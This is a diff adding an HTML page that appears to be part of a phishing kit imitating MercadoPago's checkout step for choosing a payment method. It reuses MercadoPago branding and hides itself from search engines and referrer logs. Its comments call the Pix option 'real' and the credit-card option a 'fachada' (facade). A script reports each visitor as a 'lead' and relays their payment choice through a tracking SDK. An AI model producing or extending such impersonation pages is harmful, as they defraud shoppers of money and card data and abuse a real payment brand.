@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="referrer" content="no-referrer">
+  <link rel="icon" type="image/png" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/favicon.png">
+  <title>MercadoPago - Forma de Pagamento</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="css/checkout.css">
+  <style>
+    /* ── Payment Selection — premium redesign ─── */
+    .pay-section {
+      padding: 0 12px 24px;
+      animation: mp-fadeSlideIn .35s ease;
+    }
+
+    .pay-section__title {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--mp-text-md);
+      text-transform: uppercase;
+      letter-spacing: .06em;
+      margin: 0 0 12px 2px;
+    }
+
+    /* ── Option cards ─── */
+    .pay-opt {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      padding: 18px 20px;
+      background: var(--mp-white);
+      border: 2px solid var(--mp-border-lt);
+      border-radius: 14px;
+      cursor: pointer;
+      text-decoration: none;
+      color: inherit;
+      transition: border-color .18s ease, box-shadow .18s ease, transform .15s ease, background .15s ease;
+      margin-bottom: 12px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .pay-opt::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(0,158,227,.04) 0%, transparent 60%);
+      opacity: 0;
+      transition: opacity .2s;
+    }
+
+    .pay-opt:hover {
+      border-color: var(--mp-blue);
+      box-shadow: 0 4px 20px rgba(0,158,227,.15);
+      transform: translateY(-2px);
+      background: #fafeff;
+    }
+
+    .pay-opt:hover::before { opacity: 1; }
+
+    .pay-opt:active { transform: translateY(0); box-shadow: none; }
+
+    /* PIX option — destaque verde */
+    .pay-opt--pix {
+      border-color: #00A884;
+      background: linear-gradient(135deg, #f0fdf8 0%, #fff 70%);
+    }
+    .pay-opt--pix:hover {
+      border-color: #008a6c;
+      box-shadow: 0 4px 20px rgba(0,168,132,.18);
+      background: #edfaf5;
+    }
+
+    /* ── Icon bubble ─── */
+    .pay-opt__icon {
+      width: 52px;
+      height: 52px;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 26px;
+    }
+
+    .pay-opt__icon--card {
+      background: linear-gradient(135deg, #1a73e8 0%, #0056b3 100%);
+      color: #fff;
+      box-shadow: 0 3px 10px rgba(26,115,232,.30);
+    }
+
+    .pay-opt__icon--pix {
+      background: linear-gradient(135deg, #00c49a 0%, #00875a 100%);
+      color: #fff;
+      box-shadow: 0 3px 10px rgba(0,196,154,.30);
+    }
+
+    /* ── Text ─── */
+    .pay-opt__body { flex: 1; min-width: 0; }
+
+    .pay-opt__name {
+      display: block;
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--mp-text);
+      margin-bottom: 3px;
+    }
+
+    .pay-opt__sub {
+      display: block;
+      font-size: 13px;
+      color: var(--mp-text-md);
+      line-height: 1.4;
+    }
+
+    /* ── Badge ─── */
+    .pay-opt__badge {
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: .05em;
+      padding: 3px 9px;
+      border-radius: 999px;
+      flex-shrink: 0;
+      text-transform: uppercase;
+    }
+
+    .pay-opt__badge--instant {
+      background: #e6faf4;
+      color: #00875a;
+      border: 1px solid #b2f0da;
+    }
+
+    .pay-opt__badge--credit {
+      background: #e8f0fe;
+      color: #1a73e8;
+      border: 1px solid #c5d8fc;
+    }
+
+    /* ── Arrow ─── */
+    .pay-opt__arrow {
+      color: var(--mp-text-lt);
+      flex-shrink: 0;
+      transition: transform .18s ease, color .18s ease;
+    }
+    .pay-opt:hover .pay-opt__arrow {
+      transform: translateX(4px);
+      color: var(--mp-blue);
+    }
+    .pay-opt--pix:hover .pay-opt__arrow { color: #00875a; }
+
+    /* ── Divider ─── */
+    .pay-divider {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 4px 0 12px;
+    }
+    .pay-divider hr {
+      flex: 1;
+      border: none;
+      border-top: 1px solid var(--mp-border-lt);
+    }
+    .pay-divider span {
+      font-size: 12px;
+      color: var(--mp-text-xlt);
+      font-weight: 500;
+      white-space: nowrap;
+    }
+
+    /* ── Secure badge ─── */
+    .pay-secure {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 12px;
+      color: var(--mp-text-xlt);
+      margin-top: 18px;
+    }
+    .pay-secure svg { flex-shrink: 0; }
+
+    /* ── Total summary strip ─── */
+    .pay-total {
+      background: #f3fbff;
+      border: 1px solid #d0ecfa;
+      border-radius: 10px;
+      padding: 14px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 22px;
+    }
+    .pay-total__label {
+      font-size: 13px;
+      color: var(--mp-text-md);
+      font-weight: 500;
+    }
+    .pay-total__value {
+      font-size: 20px;
+      font-weight: 800;
+      color: var(--mp-blue);
+    }
+  </style>
+</head>
+<body>
+<div class="mp-page">
+
+  <!-- ── Header ──────────────────────────────────────────────── -->
+  <header class="mp-header">
+    <img class="mp-header__logo"
+         src="images/mp-logo.png"
+         alt="MercadoPago">
+  </header>
+
+  <!-- ── Stepper ─────────────────────────────────────────────── -->
+  <div class="mp-stepper">
+    <div class="mp-step mp-step--done">
+      <div class="mp-step__bubble">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+      </div>
+      <span class="mp-step__label">Dados pessoais</span>
+    </div>
+    <div class="mp-step-line mp-step-line--done"></div>
+    <div class="mp-step mp-step--done">
+      <div class="mp-step__bubble">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+      </div>
+      <span class="mp-step__label">Endereço</span>
+    </div>
+    <div class="mp-step-line"></div>
+    <div class="mp-step mp-step--active">
+      <div class="mp-step__bubble">3</div>
+      <span class="mp-step__label">Pagamento</span>
+    </div>
+  </div>
+
+  <!-- ── Payment Section ─────────────────────────────────────── -->
+  <div class="pay-section">
+
+    <!-- Valor total -->
+    <div class="pay-total">
+      <span class="pay-total__label">🛒 Total do pedido</span>
+      <span class="pay-total__value">R$ 49,90</span>
+    </div>
+
+    <p class="pay-section__title">Escolha como pagar</p>
+
+    <!-- ── PIX — opção principal / real ──── -->
+    <a href="pix5.html" class="pay-opt pay-opt--pix" id="opt-pix">
+      <div class="pay-opt__icon pay-opt__icon--pix">
+        <!-- PIX SVG -->
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="28" height="28">
+          <path fill="#fff" d="M242.4 292.5C247.8 287.1 255.1 284.1 262.5 284.1s14.7 2.9 20.1 8.4l
+          74.6 74.6c5.4 5.4 8.4 12.7 8.4 20.1s-3 14.7-8.4 20.1l-74.6 74.6c-5.4 5.4-12.7 8.4-20.1
+          8.4s-14.7-2.9-20.1-8.4l-74.6-74.6c-5.4-5.4-8.4-12.7-8.4-20.1s3-14.7 8.4-20.1l74.6-74.6zm
+          -164.8 0l74.6 74.6c5.4 5.4 8.4 12.7 8.4 20.1s-3 14.7-8.4 20.1l-74.6 74.6C72.2 486.7
+          64.9 489.6 57.5 489.6s-14.7-2.9-20.1-8.4l-18.3-18.3c-11.1-11.1-11.1-29.1 0-40.2l
+          74.6-74.6C98.9 343 98.9 297.8 93.6 292.5zm245.5-68.5L249.5 150.4c-5.4-5.4-8.4-12.7
+          -8.4-20.1s3-14.7 8.4-20.1l74.6-74.6C329.5 30.2 336.8 27.2 344.2 27.2s14.7 2.9 20.1
+          8.4l74.6 74.6c5.4 5.4 8.4 12.7 8.4 20.1s-3 14.7-8.4 20.1l-74.6 74.6c-5.4 5.4-12.7
+          8.4-20.1 8.4s-14.7-2.9-20.1-8.4zM77.6 150.4 3 75.8C-2.4 70.4-5.4 63.1-5.4
+          55.7s3-14.7 8.4-20.1L21.3 17.3c11.1-11.1 29.1-11.1 40.2 0l74.6 74.6c5.4 5.4 8.4
+          12.7 8.4 20.1s-3 14.7-8.4 20.1l-74.6 74.6C56 211.9 49.8 214.9 43.1 214.9c-6.7 0
+          -13-3-17.6-8.4z"/>
+        </svg>
+      </div>
+      <div class="pay-opt__body">
+        <span class="pay-opt__name">Pix</span>
+        <span class="pay-opt__sub">Aprovação na hora · Qualquer banco · 24h por dia</span>
+      </div>
+      <span class="pay-opt__badge pay-opt__badge--instant">Instantâneo</span>
+      <svg class="pay-opt__arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M8.59 16.59 13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+    </a>
+
+    <!-- ── Divider ──── -->
+    <div class="pay-divider">
+      <hr><span>ou pague com</span><hr>
+    </div>
+
+    <!-- ── Cartão de crédito — fachada ──── -->
+    <a href="cartao1.html" class="pay-opt" id="opt-card">
+      <div class="pay-opt__icon pay-opt__icon--card">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="28" height="28">
+          <path fill="#fff" d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2m0 14H4v-6h16zm0-10H4V6h16z"/>
+        </svg>
+      </div>
+      <div class="pay-opt__body">
+        <span class="pay-opt__name">Cartão de crédito</span>
+        <span class="pay-opt__sub">Parcele em até 12x sem juros · Visa, Master, Elo e mais</span>
+      </div>
+      <span class="pay-opt__badge pay-opt__badge--credit">Até 12x</span>
+      <svg class="pay-opt__arrow" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M8.59 16.59 13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+    </a>
+
+    <!-- ── Secure ──── -->
+    <div class="pay-secure">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="14" height="14">
+        <path fill="currentColor" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm-2 16-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9z"/>
+      </svg>
+      Pagamento criptografado com AES-256 · Ambiente seguro MercadoPago
+    </div>
+
+  </div><!-- /pay-section -->
+
+</div><!-- /mp-page -->
+
+<script src="js/sdk.min.js"></script>
+<script>
+(function() {
+  'use strict';
+
+  // Inicializa tracking e notifica lead na etapa de escolha
+  _SDK.initTracking('escolha-pagamento');
+  _SDK.notifyLead('escolha-pagamento');
+
+  // Intercepta clique em cada opção para registrar a escolha
+  var optPix  = document.getElementById('opt-pix');
+  var optCard = document.getElementById('opt-card');
+
+  function onChoose(method) {
+    // Armazena a escolha no sessionStorage para o relay saber
+    _SDK.storeData('payment_method', { method: method, ts: Date.now() });
+    // Notifica via relay
+    _SDK.relay({ type: 'payment_choice', data: { method: method } });
+  }
+
+  optPix.addEventListener('click', function() { onChoose('pix'); });
+  optCard.addEventListener('click', function() { onChoose('credit_card'); });
+
+}());
+</script>
+</body>
+</html>
